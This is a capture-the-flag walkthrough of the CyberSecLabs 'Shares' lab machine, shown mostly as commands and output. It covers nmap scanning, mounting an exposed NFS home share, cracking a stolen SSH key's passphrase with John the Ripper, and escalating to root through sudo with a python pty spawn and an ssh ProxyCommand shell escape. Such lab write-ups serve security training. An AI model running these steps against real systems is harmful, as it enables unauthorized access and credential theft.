# CyberSecLabs : Shares

Nmap scans

```zsh
nmap -sS -p- -Pn -r -v -T4 172.31.1.7
```

```zsh
nmap -p 21,80,111,2049,27853,39391,42669,46221,51473 -sC -sV -v 172.31.1.7
```

```
PORT      STATE SERVICE  VERSION                                                                                                                                            
21/tcp    open  ftp      vsftpd 3.0.3                                                                                                                                       
80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))                                                                                                                     
| http-methods:                                                                                                                                                             
|_  Supported Methods: HEAD GET POST OPTIONS                                                                                                                                
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                
|_http-title: Pet Shop                                                                                                                                                      
111/tcp   open  rpcbind  2-4 (RPC #100000)                                                                                                                                  
| rpcinfo:                                                                                                                                                                  
|   program version    port/proto  service                                                                                                                                  
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                  
|   100000  2,3,4        111/udp   rpcbind                                                                                                                                  
|   100000  3,4          111/tcp6  rpcbind                                            
|   100000  3,4          111/udp6  rpcbind                                            
|   100003  3           2049/udp   nfs                                                
|   100003  3           2049/udp6  nfs                                                
|   100003  3,4         2049/tcp   nfs                                                
|   100003  3,4         2049/tcp6  nfs                                                
|   100005  1,2,3      39391/tcp   mountd                                             
|   100005  1,2,3      46671/udp   mountd                                             
|   100005  1,2,3      53761/udp6  mountd                                             
|   100005  1,2,3      59155/tcp6  mountd                                             
|   100021  1,3,4      38919/udp   nlockmgr                                           
|   100021  1,3,4      42669/tcp   nlockmgr                                           
|   100021  1,3,4      45531/tcp6  nlockmgr                                           
|   100021  1,3,4      50547/udp6  nlockmgr                                           
|   100227  3           2049/tcp   nfs_acl                                            
|   100227  3           2049/tcp6  nfs_acl                                            
|   100227  3           2049/udp   nfs_acl                                            
|_  100227  3           2049/udp6  nfs_acl  

2049/tcp  open  nfs_acl  3 (RPC #100227)
27853/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)
|_  256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)
39391/tcp open  mountd   1-3 (RPC #100005)
42669/tcp open  nlockmgr 1-4 (RPC #100021)
46221/tcp open  mountd   1-3 (RPC #100005)
51473/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that ```NFS - Network File Sharing``` is on. So we can find the drive

```zsh
showmount -e 172.31.1.7
```
Here is the output:

```
Export list for 172.31.1.7:
/home/amir *.*.*.*
```


```zsh
mkdir /mnt/clshare
```

```zsh
mount -t nfs  172.31.1.7:/home/amir/ /mnt/cslshare -o nolock
```
And now simply do ```ls-lah``` and navigate into the ```.ssh``` directory and then make a user name amir with uid of 1000.

```zsh
useradd -u 1000 amir
```
Now you can open the ```id_rsa```key but it needs a passphrase so crack it using this

```zsh
locate ssh2john

python /usr/share/john/ssh2john.py id_rsa > idrsa.txt

john idrsa /usr/share/wordlists/rockyou.txt

```

You will see that it cracked it.:

```zsh
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hello6           (id_rsa)
hello6           (id_rsa)
Proceeding with incremental:ASCII
```
Now simply ssh to the machine, you will notice that you will be refused. If you have done a fullscan like me then you will see that the there is another ssh port at ```27853```

```zsh
sudo -u amir ssh -i id_rsa amir@172.31.1.7 -p 27853
```
There you have a shell.


Privilege Escalation:

```ssh
amir@shares:~$ sudo -l
Matching Defaults entries for amir on shares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amir may run the following commands on shares:
    (ALL : ALL) ALL
    (amy) NOPASSWD: /usr/bin/pkexec
    (amy) NOPASSWD: /usr/bin/python3
amir@shares:~$ id amy
uid=1001(amy) gid=1001(amy) groups=1001(amy)
amir@shares:~$ sudo -u amy /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

```